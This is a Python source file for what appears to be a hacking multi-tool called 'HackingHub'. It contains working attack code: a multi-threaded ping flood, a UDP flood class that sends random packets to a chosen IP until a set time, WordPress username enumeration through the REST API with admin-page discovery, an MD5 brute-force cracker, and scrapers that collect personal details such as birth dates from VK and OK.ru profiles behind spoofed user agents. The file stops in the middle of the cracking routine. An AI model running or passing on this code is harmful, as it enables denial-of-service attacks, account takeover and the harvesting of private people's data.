from colorama import init
from colorama import Fore
from pystyle import Colors, Colorate
import time
import datetime
import os
import requests
from bs4 import BeautifulSoup
import random
import socket
import threading
import webbrowser
import builtwith
import json
from itertools import product
import hashlib
from telnetlib import Telnet
import subprocess
import validators as valid
import re
from pystyle import Colorate, Colors
import smtplib
import platform
import getpass
import sys
import datetime

def art():
    print(f"{Fore.BLUE} /$$   /$$                     /$$       /$$                     /$$   /$$           /$$            ")
    print(f"{Fore.BLUE}| $$  | $$                    | $$      |__/                    | $$  | $$          | $$            ")
    print(f"{Fore.LIGHTBLUE_EX}| $$  | $$  /$$$$$$   /$$$$$$$| $$   /$$ /$$ /$$$$$$$   /$$$$$$ | $$  | $$ /$$   /$$| $$$$$$$       ")
    print(f"{Fore.CYAN}| $$$$$$$$ |____  $$ /$$_____/| $$  /$$/| $$| $$__  $$ /$$__  $$| $$$$$$$$| $$  | $$| $$__  $$      ")
    print(f"{Fore.LIGHTCYAN_EX}| $$__  $$  /$$$$$$$| $$      | $$$$$$/ | $$| $$  \ $$| $$  \ $$| $$__  $$| $$  | $$| $$  \ $$      ")
    print(f"{Fore.CYAN}| $$  | $$ /$$__  $$| $$      | $$_  $$ | $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$      ")
    print(f"{Fore.LIGHTBLUE_EX}| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$| $$| $$  | $$|  $$$$$$$| $$  | $$|  $$$$$$/| $$$$$$$/      ")
    print(f"{Fore.BLUE}|__/  |__/ \_______/ \_______/|__/  \__/|__/|__/  |__/ \____  $$|__/  |__/ \______/ |_______/       ")
    print(f"{Fore.BLUE}                                                       /$$  \ $$                                    ")
    print(f"{Fore.BLUE}                                                      |  $$$$$$/                                    ")
    print(f"{Fore.BLUE}                                                       \______/                                     ")



def fakeuseragent():
    ua = random.choice(('Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1',
'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1',
'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5',
'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20',
'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a',
'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2',
'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0',
'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1',
'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2',
'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0',
'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5',
'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN'
))
    return ua

def checkhost(url):
    if not valid.url(url):
        print(Fore.RED + "It's not a URL!")
        return
    getbrowser = f'https://check-host.net/check-http?host={url}'
    webbrowser.open(getbrowser, new=2)
    print('Ready!')

def ping(host):
    packets = int(input('Package size: '))
    if packets < 1:
        print('Negative numbers are not accepted!')
        return

    threads = int(input('Number of threads: '))
    if threads < 1:
        print('Negative numbers and 0 are not accepted!')
        return

    if os.name == 'nt':
        for _ in range(threads):
            os.system(f'start ping {host} -l {packets} -t')
    else:
        for _ in range(threads):
            process = subprocess.Popen(f'ping {host} -s {packets}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def tiktokparser(username):
    try:
        url = f'https://socialblade.com/tiktok/user/{username}' #statistics socialblade
        headers = {
            'User-Agent': fakeuseragent(),
            'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3'
        }
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        unwanted = soup.find('div', attrs={'style': 'float: right; opacity: 0.7; font-weight: bold;'})
        unwanted.extract()#throws unnecessary html code
        infos = soup.find_all('div', class_='YouTubeUserTopInfo')
        counts = [] #data is filled into an empty array
    except AttributeError:
        print(Fore.RED + "This account has less than 25,000 followers, so it's not in the database.")
        return
    
    for i in infos:
            itemName = i.find('span', class_='YouTubeUserTopLight')
            itemCount = i.find('span', attrs={'style': 'font-weight: bold;'})
            print(f'{itemName.text}: {itemCount.text}')
            counts.append(f'{itemName.text}: {itemCount.text}')

    saveit = input('Save to TXT file? (y or n):')
    if saveit == 'Y' or saveit == 'y':
        with open('tiktoktdata.txt', 'w') as file:
            file.write(f'Username: {username}\n' + '\n'.join(counts))

def vkparser(url):
    if not valid.url(url):
        print(Fore.RED + "It's not a URL!")
        return
    headers = {
        'User-Agent': fakeuseragent(),
        'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3'
    }
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    name = soup.find('h1', class_='page_name').text
    infos = soup.find_all('a', class_='page_counter')
    counts = [] #data is filled into an empty array
    print(name)

    for i in infos:
        itemName = i.find('div', class_='label').text.title()
        itemCount = i.find('div', class_='count').text.title()
        print(f'{itemName}: {itemCount}')
        counts.append(f'{itemName}: {itemCount}')
    saveit = input('Save to TXT file? (y or n): ')
    if saveit == 'Y' or saveit == 'y':
        with open('vkdata.txt', 'w') as file:
            file.write(f'URL: {url}\n' + '\n'.join(counts))

def okparser(url):
    if not valid.url(url):
        print(Fore.RED + "It's not a URL!")
        return
    headers = {
        'User-Agent': fakeuseragent(),
        'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3'
    }
    try:
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        name = soup.find('a', class_='profile-user-info_name')
        birthday = soup.find('div', attrs={'data-type': 'AGE'})
        photo = soup.find('a', class_='recent-photos_total-counter')
        friends = soup.find('a', attrs={'data-l': 'outlandermenu,friendFriend'}).find('span')
        groups = soup.find('a', attrs={'data-l': 'outlandermenu,friendAltGroup'}).find('span')
        games = soup.find('a', attrs={'data-l': 'outlandermenu,friendApps'}).find('span')
    except AttributeError:
        print(Fore.RED + 'User is not found!')
        return

    print(f'\nUser:  {name.text}')
    print(f'Date of birth: {birthday.text}')
    print(f'Number of friends: {friends.text}')
    print(f'Number of groups: {groups.text}')
    print(f'Number of photos: {photo.text}')
    print(f'Number of games: {games.text}')
    saveit = input('Save to TXT file? (y or n): ')
    if saveit == 'Y' or saveit == 'y':
        with open('okdata.txt', 'w') as file:
            file.write(f'URL: {url}\nUser: {name.text}\nDate of birth: {birthday.text}\nNumber of friends: {friends.text}\nNumber of groups: {groups.text}\nNumber of photos: {photo.text}\nNumber of games: {games.text}')

class launchudp:
    def __init__(self, ip, port, thread, t, until):
        self.ip = ip
        self.port = port
        self.thread = thread
        self.t = t
        self.until = until

    @staticmethod
    def attackudp(ip, port, t, until_datetime):
        if not valid.ip_address.ipv4(ip):
            print(Fore.RED + "It's not an IP!")
            return
        data = random._urandom(1024)
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            i = random.choice(('[*]', '[&]', '[#]'))
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip), int(port))
                for _ in range(t):
                    s.sendto(data, addr)
                    print(Fore.GREEN + i + ' Sent!')
            except:
                print(Fore.RED + '[@] Error!')

class wordpress:
    def __init__(self, url):
        self.url = url

    @staticmethod
    def urlTools(url):
        if url.lower().startswith('https://') or url.lower().startswith('http://'):
            url = url.replace('http://', '').replace('https://', '')  #removes https://or http://at the beginning of the link
        return url

    @staticmethod
    def getusernamewordpress(url):
        Headers = {
            'Accept': '*/*',
            'User-Agent': fakeuseragent()
        }
        r = requests.get(f'{url}/wp-json/wp/v2/users/', headers=Headers).text
        try:
            j = json.loads(r)
        except json.decoder.JSONDecodeError:
            return Fore.RED + '   ' + 'Пользователи скрыты!'
        count = len(j) - 1
        attempts = 0
        user = ''
        for _ in j:
            split = '\n'
            if count == attempts:
                split = ''
            users = j[attempts]['slug']
            if not users == '':
                user += Fore.GREEN + '   ' + '[+] ' + users + split
            attempts += 1
        if user == '':
            user = Fore.RED + '   ' + 'Not found!'
        return user

    @staticmethod
    def adminpage(url):
        r = requests.get(f'{url}/wp-admin', allow_redirects=False)
        adminpageurl = ''
        if r.status_code == 301:
            adminpageurl = Fore.GREEN + '   ' + f'{url}/wp-admin'
            return adminpageurl
        else:
            adminpageurl = Fore.RED + '   ' + 'Not found!'
            return adminpageurl

    @staticmethod
    def infoaboutwebsite(url):
        data = builtwith.parse(url)
        totalinfo = ''
        for key in data:
            information = (f"{key}: {str(data[key]).replace('[', '').replace(']', '')}")
            totalinfo += '\n   ' + information
        return totalinfo

    def wordpressgetinfo(self):
        target = self.url
        try:
            url = wordpress.urlTools(target).title()
            Ip = socket.gethostbyname(url)
        except socket.gaierror:
            print(Fore.RED + 'Subdomains are not supported!')
            return
        
        username = Fore.YELLOW + '[+] Users: \n' + wordpress.getusernamewordpress(f'http://{url}')
        adminpageadress = Fore.YELLOW + '[+] Admin: \n' + wordpress.adminpage(f'http://{url}')
        infowebsite = Fore.YELLOW + '[+] Information: ' + Fore.GREEN + wordpress.infoaboutwebsite(f'http://{url}')
        print(Fore.RED + f'Domain: {url}\nIP: {Ip}\n{infowebsite}\n{username}\n{adminpageadress}')  #information output

class md5:
    def __init__(self, md5hash, minlen, maxlen):
        self.md5hash = md5hash
        self.minlen = minlen
        self.maxlen = maxlen

    @staticmethod
    def computeMD5hash(string):
        m = hashlib.md5()
        m.update(string.encode('utf-8'))
        return m.hexdigest()

    def bruteforce(self):

        validhash = re.finditer(r'(?=(\b[A-Fa-f0-9]{32}\b))', self.md5hash)

        result = [match.group(1) for match in validhash]

        if not result:
            print(Fore.RED + 'This is not an MD5 hash!')
            return

        chr = '''1): ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklnmopqrstuvwxyz1234567890
    2): abcdefghijklnmopqrstuvwxyz1234567890
    3): ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
    4): 1234567890
    5): ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklnmopqrstuvwxyz
    6): ABCDEFGHIJKLMNOPQRSTUVWXYZ
    7): abcdefghijklnmopqrstuvwxyz'''

        print(chr)

        char_num = int(input('Select symbols: '))

        if char_num == 1:
            chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklnmopqrstuvwxyz1234567890'
        elif char_num == 2:
            chars = 'abcdefghijklnmopqrstuvwxyz1234567890'
        elif char_num == 3:
            chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
        elif char_num == 4:
            chars = '1234567890'
        elif char_num == 5:
            chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklnmopqrstuvwxyz'
        elif char_num == 6:
            chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        elif char_num == 7:
            chars = 'abcdefghijklnmopqrstuvwxyz'
        else:
            print(Fore.RED + 'This option does not exist!')
            return

        saveit = str(input('Save to TXT? (Y/N): '))
        if saveit == 'Y' or saveit == 'y':
            name = input('File name without extension: ') + '.txt'

        stop = 0
        found = 0
        lines = 0

        if saveit == 'Y' or saveit == 'y':
            filetxt = open(name, 'w')

        startedtime = time.time()

        for length in range(self.minlen, self.maxlen):
            to_attempt = product(chars, repeat=length)
            for attempt in to_attempt:
                crypt = md5.computeMD5hash(''.join(attempt))
                if crypt == self.md5hash:
                    print(Fore.GREEN + '[CRACKED] {} = {}\n'.format(crypt, ''.join(attempt)))
                    if saveit == 'Y' or saveit == 'y':
                        filetxt.write('[CRACKED] {} = {}\n'.format(crypt, ''.join(attempt)))
                    stop = 1
                    found = 1
                    break
                else:
                    if saveit == 'Y' or saveit == 'y':
                        filetxt.write('{} = {}\n'.format(crypt, ''.join(attempt)))
                    print('{} - {}'.format(''.join(attempt), crypt))
                    lines += 1
            if stop == 1:
                break

        if saveit == 'Y' or saveit == 'y':
            filetxt.close()
        now = time.time()
        timespent = now - startedtime

